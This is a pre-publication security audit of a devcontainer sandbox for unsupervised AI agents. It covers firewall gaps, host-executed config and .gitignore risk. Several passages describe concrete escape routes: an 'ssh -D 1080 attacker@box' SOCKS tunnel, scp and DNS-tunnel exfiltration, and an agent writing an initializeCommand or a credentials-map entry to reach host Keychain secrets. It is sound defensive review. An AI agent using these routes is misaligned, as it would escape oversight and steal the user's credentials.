# Pre-publication privacy and security audit

Date: 2026-08-21 09:18 EDT

**Subject: the EconYoloBox publication checkout** at
`/workspace/Live,AIWorkFlow/EconYoloBox`, not this workspace. Repo-relative
paths below (`.devcontainer/…`, `docs/features.md`) are that checkout's.

**Status (2026-08-21): shipping as-is.** A deadline forced publication before
any of this was fixed. Nothing below was acted on — treat every "fix" and every
item under [Open](#open) as a recommendation, not a change that happened.

Full read of it before first publication: all 51 tracked files, the single
commit `455dd77`, and every security-relevant path (credential flow, firewall,
sudo scope, agent policy, host-side scripts). Nothing is published yet, so
everything below is still cheap to change.

Prior art: [0724b,firewall-exfil-risk.md] already worked the Google/`goog.json`
exfil question and the access model for the two copies of `init-firewall.sh`.
The findings here are **additive** — that entry never looked at the
pre-allowlist ACCEPT rules.

## Bottom line

**No secrets and no personal data are committed.** No keys, tokens, passwords,
emails, host paths, or IP addresses; `credentials-map.json` holds only env-var
*names*; history is one clean commit with nothing to purge. So publication is
not blocked by anything at rest.

What is worth fixing is a **gap between what the docs claim and what the
firewall does**, plus a `.gitignore` posture that is fine for a private repo and
wrong for a public one.

## 1. Two open ports defeat the deny-by-default claim (inherited from upstream)

`.devcontainer/init-firewall.sh:63` and `:67` are appended to `OUTPUT` *before*
the ipset match and the final REJECT, so they apply to every destination on the
internet:

```
:63  iptables -A OUTPUT -p udp --dport 53 -j ACCEPT
:67  iptables -A OUTPUT -p tcp --dport 22 -j ACCEPT
```

- **TCP/22 — unrestricted outbound SSH to any host.** This is not a gap in the
  allowlist, it is a general-purpose bypass of it: `scp` the workspace anywhere,
  `git push` to a non-GitHub remote, or `ssh -D 1080 attacker` and tunnel all
  remaining traffic through a host the ipset never sees. Nothing in the repo
  uses SSH.
- **UDP/53 — DNS to any resolver, not just the local dnsmasq.** A classic
  tunneling exfil channel, and it also lets any process sidestep the
  resolve-time `allowed-volatile` path by querying `8.8.8.8` directly.

Why this matters more than the Google surface in [0724b]: that entry's honest
framing was "the box was never sealed against a determined exfiltrator, but it
does block opportunistic phone-home from a bad dependency." Port 22 breaks even
that narrower claim — an opportunistic C2 on 22 is not blocked at all.

**Provenance: both rules come from Anthropic's reference devcontainer, verbatim.**
Checked against
`anthropics/claude-code@main:.devcontainer/init-firewall.sh` (fetched
2026-08-21, HTTP 200), lines 29-35 — identical rules *and* identical comments,
including "Allow outbound SSH". The `HOST_NETWORK` /24 pair and the absence of
any `ip6tables` rule (zero occurrences upstream) are inherited the same way.
Nothing here was introduced locally.

That cuts both ways. It means this is not a mistake made in this repo, and
`docs/features.md:11-25` explicitly rests the safety argument on keeping
upstream's reviewed shape. But the same section is what makes the gap worth
closing rather than inheriting quietly: the lineage argument is "many people
reviewed this design," and these two rules are the part of it that the local
docs then describe inaccurately. Upstream also ships no research-data or
credential story, so it is not carrying the same claim.

Divergence is cheap here — this script already diverges substantially (dnsmasq,
`goog.json`, the volatile ipset, the re-run guard). Deviating on 22 and 53 costs
a comment saying why.

Meanwhile `docs/features.md:46-51` advertises the firewall as fail-closed and
deny-by-default, and neither port is mentioned in `docs/features.md`,
`.devcontainer/README.md`, or `test-firewall.sh`.

**Fix:** narrow 22 to the GitHub ranges already in `allowed-domains`, or drop the
rule entirely; point 53 at `127.0.0.1` plus the stashed upstream. Then add a
probe to `test-firewall.sh` so a future edit cannot silently reopen either.

Related and smaller: `ip6tables` is never touched (upstream does not either), so
the whole policy is IPv4-only.

### Why they are there

Upstream gives no rationale — the comment is just `# Allow outbound SSH`. So I
went looking for provenance instead. Both rules are in the **initial commit**
(`bd5ca70`, 2025-02-22) and have never been touched across the ten commits that
have since modified that file. There is no commit message to read: this is
original design that nobody revisited, not something that accreted.

One ordering fact reshapes the analysis. The rules sit at upstream lines 16-22,
but `-P OUTPUT DROP` does not land until line 93 (here: rules at 63-69, DROP at
244). **At the point these ACCEPTs are appended the default policy is still
ACCEPT**, so they do nothing for the script's own `dig` loop, which works
regardless. They exist purely for runtime, after arming.

A second clue about intent: `-A INPUT -p tcp --sport 22 -m state --state
ESTABLISHED` is fully subsumed by the general `-A INPUT -m state --state
ESTABLISHED,RELATED` rule further down, and *both were present in the initial
commit*. These read as "make sure the obvious things keep working" rules, not
scoped policy.

**UDP/53 — near-forced, and defensible.** After arming, the allowlist is
IP-based: an ipset of addresses resolved at startup. Applications resolve names
before they connect, so blocking DNS makes every connection fail at resolution
even though the destination IP is allowed — the allowlist becomes useless.

Why blanket rather than just the resolver? Because the resolver's address is not
knowable in advance. Docker's embedded DNS at `127.0.0.11` is covered by the
`-o lo` rule, but dockerd *forwards* those queries from inside the container's
netns to the host's upstream nameserver — whatever `resolv.conf` says: corporate
DNS, a VPN resolver, `8.8.8.8`, a router at `192.168.1.1`. It varies per user and
per network, and changes the moment someone joins a VPN.

The consequences are sharply asymmetric. Too-narrow DNS means *no* DNS, the
container is comprehensively broken, and the symptom ("everything is down")
points nowhere near the firewall. Too-broad DNS is invisible and nothing breaks.
For a template shipped to strangers on unknown networks, the permissive choice
is the one that never generates a bug report. Reasonable engineering, not an
oversight.

Note the local twist: the dnsmasq work makes the narrow fix **easier here than
upstream**, because it already introduces a known local resolver and stashes the
real upstream in `/etc/dnsmasq-upstream.conf`. Upstream does not have that
address; we do.

**TCP/22 — weaker, and this part is inference.** The motive cannot be GitHub:
GitHub's ranges are already in the ipset via `api.github.com/meta` (including
the `.git` field), so `git@github.com` SSH is permitted *without* the port-22
rule. Whatever it is for, it is non-GitHub SSH — most plausibly private or
enterprise git remotes (GitLab, Bitbucket, self-hosted, Enterprise Server) that
a general-purpose template cannot enumerate, plus SSH to remote dev boxes.
Without it, every user with a corporate git host would have to hand-patch the
allowlist.

The assumption that likely made it feel cheap, and that does not survive contact
with an agent threat model: **SSH looks like it requires an existing trusted
relationship.** HTTP exfil needs no credential; SSH seems to need a key some
remote already trusts. That is backwards here. `scp`, or `ssh -D 1080
attacker@box`, needs only credentials the *attacker* supplies — they own the
destination and can accept any key, or simply enable passwords. No pre-existing
trust is involved.

And 22 is qualitatively worse than 53 for a reason unrelated to exfil volume:
`ssh -D` is a **SOCKS proxy**, which bypasses the entire IP allowlist for every
protocol at once. DNS tunneling is a slow, awkward channel; an SSH dynamic
forward is a general-purpose hole through the whole design.

**So they are not really a pair**, which cuts against how the top of this
section frames them. If and when this is revisited: 53 stays, scoped to the
local resolver plus the stashed upstream, and needs a `test-firewall.sh` probe
because getting it wrong breaks DNS outright. 22 is probably just deletable —
nothing here uses SSH, GitHub is already covered by the ipset, and the reason it
exists upstream (unknowable third-party git remotes on a template shipped to
strangers) does not apply to a single-user research box. If a non-GitHub remote
ever appears, add that host to the allowlist like everything else.

 Docker's default has IPv6 off and the `example.com` verification
would happen to catch it (curl prefers v6), but an explicit
`ip6tables -P OUTPUT DROP` is nearly free.

## 2. Host-executed config is writable from inside — structural, plus local amplification

Split this into the part every devcontainer has and the part that is ours. The
first is documentation; the second is a real fix.

### The structural half

**Any** devcontainer where the repo is bind-mounted read-write and
`devcontainer.json` lives inside it has this property, because
`devcontainer.json` *is* host-executed configuration. The exploit does not
require a host-side hook to already exist — an agent with write access can
simply add an `initializeCommand` to a config that has none.

Verified against the reference implementation
(`anthropics/claude-code@main:.devcontainer/devcontainer.json`, fetched
2026-08-21, HTTP 200): it has **no `initializeCommand` at all**. Its only hook is
`postStartCommand`, which runs inside the container. Its workspace mount is the
same read-write bind:

```
53:  "workspaceMount": "source=${localWorkspaceFolder},target=/workspace,type=bind,consistency=delegated"
55:  "postStartCommand": "sudo /usr/local/bin/init-firewall.sh"
```

So upstream is exposed in kind despite executing nothing host-side. This is the
default shape the tooling steers everyone into, not a local mistake.

**Why the standard mitigation misses it.** VS Code Workspace Trust answers a
different question — "I cloned a repo I do not know, is opening it safe?" — as a
one-time human decision at clone time. It is inert here: the trust decision was
made correctly, and the contents changed *afterward*, with no human in the loop.
Trust is not re-evaluated when an already-trusted file is rewritten. An
unsupervised agent with write access inside a trusted repo is not a case that
model was built for.

That reframes the earlier note in this entry's first draft. It is not "a flaw to
fix before publishing." It is a platform property that this repo's threat model
makes load-bearing, because `docs/features.md:26-29` asserts the container is
the boundary for deliberately unsupervised agents, which an ordinary project's
devcontainer never claims. Documenting it is therefore the minimum, and it can
be documented without embarrassment — the honest sentence is roughly: *the
container bounds the process and the network; it does not bound writes to
host-executed config, and that is true of devcontainers generally.*

Corollary worth keeping: closing it is then a **differentiator**, not a patch.
If the hole is universal and unaddressed upstream, a devcontainer that actually
shuts it is doing something nobody else is — which is precisely the pitch for a
box built to run YOLO agents.

### The local amplification

What is ours is not the existence of the hole but the path length and the
payoff:

- **Path length.** Upstream: add a hook, then wait for a rebuild that may never
  come. Here: four scripts already execute host-side on *every* container start,
  so a write lands on the next `dcu` with no config change and nothing anomalous
  to notice.
- **Payoff.** Upstream's host-side surface reaches nothing. Ours ends at the
  macOS Keychain — that is what `inject-credentials.py` is *for*.

The full host-executed set is wider than the three scripts I first listed:

| File | How the host executes it |
|---|---|
| `.devcontainer/devcontainer.json` | root of trust — *defines* `initializeCommand` |
| `.devcontainer/write-local-env.sh` | `initializeCommand` |
| `.devcontainer/find-python.sh` | sourced by `initializeCommand` |
| `.devcontainer/inject-credentials.py` | `initializeCommand` |
| `.credentials/get-credentials.py` | `SourceFileLoader`'d by the above, on the host |
| `.credentials/credentials-map.json` | read on the host; **drives which Keychain items get read** |
| `.host/devcontainer.zsh` | **sourced into the interactive host shell** via the rc |
| `.host/dc-resolve.py` | run on the host by `dce` / `dccode` |

`credentials-map.json` is data, not code, and still reaches the Keychain: adding
`{"github-token": "GITHUB_TOKEN"}` makes the host-side script look that item up
and write the value into the container-readable env file. macOS should prompt
for items not created by `/usr/bin/security` itself, so this is not silent — but
it is why `.credentials/` belongs in the protected set despite containing no
host-executed code.

### `.host/` is the genuinely local problem

It does not get to shelter under "this is standard," because it is not standard
and is outside the devcontainer spec entirely: a repo directory sourced into the
interactive host shell via the user's rc. No rebuild required, no container
involved, fires on every new shell — and `devcontainer.zsh` runs *in* the shell
rather than as a subprocess. This is strictly worse than `initializeCommand` and
should be fixed on its own merits regardless of what is decided about §2's
structural half.

### Mechanism, tested this session

- **Permission bits are not a control.** The workspace mount is VirtioFS in
  `fakeowner` mode (`/proc/mounts`: `fakeowner rw,nosuid,nodev,relatime`).
  Everything shows as `node:node` regardless of host ownership and the bits are
  advisory: setting a file to `444` and appending to it anyway **succeeded**. So
  `chmod`/`chown` from either side, and host-side `chflags uchg`, are all dead
  ends.
- **A nested read-only bind mount is a real control.** `MS_RDONLY` is a kernel
  mount flag, enforced independently of the fakeowner uid emulation, and Docker
  mounts targets parent-first by path depth so a nested bind stacks on top of
  `/workspace`. `node` cannot undo it: `CapEff: 0000000000000000` (no
  capabilities at all — `NET_ADMIN`/`NET_RAW` belong to the container, not the
  user), and `mount --bind` returns "must be superuser". Sudo is scoped to the
  single firewall path.

```jsonc
"source=${localWorkspaceFolder}/.devcontainer,target=/workspace/.devcontainer,type=bind,readonly",
"source=${localWorkspaceFolder}/.credentials,target=/workspace/.credentials,type=bind,readonly",
"source=${localWorkspaceFolder}/.host,target=/workspace/.host,type=bind,readonly",
```

Rejected alternative: **file-level** readonly mounts for just the eight files,
which would keep `.devcontainer/` editable. A file bind pins an *inode*, so a
host-side `git pull` or any editor saving via atomic rename silently detaches the
mount and leaves stale content until restart. Wrong trade for a repo pulled on
two machines.

Preferred shape: directory-level readonly as the armed default, with a
commented-out open variant and a `shellrc.sh` banner — the existing
`FIREWALL-WINDOW-OPEN` idiom. Devcontainer surgery from inside becomes a
deliberate, loud, rebuild-scoped act instead of the default. `.credentials/` and
`.host/` can stay readonly permanently; they are essentially never edited from
inside.

### Residual after the mount

- **`.devcontainer.json` at the repo root.** A readonly mount stops
  modification, not *creation beside it*. VS Code discovers
  `.devcontainer/devcontainer.json`, then `.devcontainer.json`, then
  `.devcontainer/*/devcontainer.json`, and shows a picker when several exist.
  Not silent, but a social-engineering vector no mount can close.
- **The `Dockerfile`** stays writable under the softened options. It does not
  execute on the host OS, but it defines the image subsequently trusted.
- **Checksum-pin `.host/*`** in the machine-settings repo
  (`MacUser/Shell-rc/`), which lives outside the workspace, and verify before
  sourcing. A complement, not a substitute — it is the one link
  `initializeCommand` structurally cannot check about itself.

## 3. `.gitignore` posture is inverted for a public repo

Private research is protected by **exact folder name**:

```
My-Project/  Other/  LIBRARY/  dev/  DONE/
```

In a public repo that is an allowlist turned inside out: the day a new project
folder appears next to those, a routine `git add -A` publishes it. Note that
`screenshot_directory` in `SANDBOX.toml` points at `/workspace/dev/`, which is
covered today only by that name-based rule — as is this journal entry.

**Fix before going public:** flip to deny-by-default — `/*` plus explicit `!`
un-ignores for the ~8 tracked top-level paths.

## 4. Noted, not blocking

- **`/tmp/devcontainer-credentials.env`** — plaintext secrets at a fixed,
  predictable host path that outlives the container. `.devcontainer/README.md:66`
  already acknowledges the lingering. The write itself is done carefully
  (`O_NOFOLLOW`, `fstat` regular-file + uid check, `0600`), and the predictable
  name is a nuisance only on a multi-user host, where a pre-created file makes it
  fail loudly rather than leak. A stop-time truncation, or moving it under
  `~/.cache`, would close it.
- **Telemetry egress is allowlisted**: `sentry.io`,
  `copilot-telemetry.githubusercontent.com`, `collector.github.com`,
  `default.exp-tas.com`. Fine as a choice — [0724b] already counts Sentry as an
  open general channel — but for a repo aimed at researchers handling licensed
  WRDS data it deserves an explicit line in the docs rather than only a journal
  entry.
- **`HOST_NETWORK` /24 is open both directions** (`init-firewall.sh:238-239`).
  Standard for Docker DNS, and also inherited verbatim from upstream, but it
  reaches the host gateway and every sibling container.

## What held up well

Worth recording, so a later pass does not re-litigate it:

- **Sudo scope**: `NOPASSWD` for `/usr/local/bin/init-firewall.sh` only,
  root-owned, so the agent can enforce the firewall but not rewrite it in a
  running container. (Confirms [0724b]'s access-model section still holds.)
- **Credential design**: host Keychain to a `0600` file, bind-mounted read-only,
  read on demand; never in `Config.Env`, never in PID 1's `environ`. The
  `docs/features.md` "what this does not do" paragraph is accurate, not
  oversold.
- **Volume keying** by `${devcontainerId}` rather than folder basename — the
  same-basename token-sharing bug upstream fixed in July 2025.
- **Fail-closed trap** in `init-firewall.sh`, plus the refuse-to-re-run guard.
- **Enforced agent policy** (`/etc/claude-code/managed-settings.json`,
  `/etc/codex/requirements.toml`) root-owned at `0444`, with
  `test-agent-policy.sh` verifying the effective policy rather than the file's
  existence.
- The one tracked symlink, `.devcontainer/agents/SANDBOX-AGENTS.md`, is relative
  and points inside the repo.

## Open

Ordered by what I would do first:

1. Narrow or drop TCP/22; scope UDP/53 to the local resolver; add probes for
   both to `test-firewall.sh`. Comment the divergence from upstream at the rule
   site, so a later resync does not silently restore it.
2. Flip `.gitignore` to deny-by-default before the repo goes public.
3. Document the host-side `initializeCommand` execution path — once next to the
   boundary claim in `features.md`, once as a clone-time warning in the README.
4. Decide whether the telemetry hosts stay, and say so in the docs either way.

[0724b,firewall-exfil-risk.md]: 0724b,firewall-exfil-risk.md
